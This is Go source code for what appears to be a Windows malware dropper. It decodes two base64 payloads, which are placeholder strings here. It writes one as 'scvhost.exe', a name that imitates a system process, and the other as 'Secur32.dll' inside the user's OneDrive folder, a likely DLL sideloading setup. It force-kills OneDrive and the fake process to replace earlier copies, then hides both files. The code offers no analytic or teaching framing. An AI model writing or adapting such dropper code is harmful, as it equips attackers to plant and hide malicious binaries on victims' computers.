package main

import (
    "os"
    "fmt"
    "log"
    "time"
    "os/exec"
    "runtime"
    "path/filepath"
    "encoding/base64"
)

var (
    shell string
    flag  string
)

func init() {
    switch runtime.GOOS {
    case "windows":
        shell = "cmd"
        flag = "/c"
    default:
        shell = "bash"
        flag = "-c"
    }
}

func Popen(command string, args ...interface{}) error {
    cmd := fmt.Sprintf(command, args...)
    process := exec.Command(shell, flag, cmd)
    process.Stdin = os.Stdin
    process.Stdout = nil
    process.Stderr = nil

    return process.Run()
}

func main() {
    encodedExeData := "noisemakers"
    encodedBinaryData := "noisemakerx"

    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
    if err != nil {
        log.Fatalf("Failed decoding Base64 executable string: %s", err)
    }

    binaryData, err := base64.StdEncoding.DecodeString(encodedBinaryData)
    if err != nil {
        log.Fatalf("Failed decoding Base64 binary string: %s", err)
    }

    exeOutputPath := "C:\\Users\\Public\\Libraries\\scvhost.exe"
    binaryOutputPath := filepath.Join(os.Getenv("USERPROFILE"), "AppData\\Local\\Microsoft\\OneDrive\\Secur32.dll")

    paths := []string{exeOutputPath, binaryOutputPath}
    for _, path := range paths {
        if _, err := os.Stat(path); !os.IsNotExist(err) {
            if err := os.Remove(path); err != nil {
                log.Printf("Failed to remove file: %s", err)
                Popen("taskkill /im OneDrive.exe /im scvhost.exe /f")
                time.Sleep(3 * time.Second)
                os.Remove(path)
                time.Sleep(3 * time.Second)
            }
        }
    }

    if err := os.WriteFile(exeOutputPath, exeData, 0644); err != nil {
        log.Fatalf("Failed to write file: %s", err)
    }

    if err := os.WriteFile(binaryOutputPath, binaryData, 0644); err != nil {
        log.Fatalf("Failed to write file: %s", err)
    }

    Popen("attrib +h %s", exeOutputPath)
    Popen("attrib +h %s", binaryOutputPath)
}
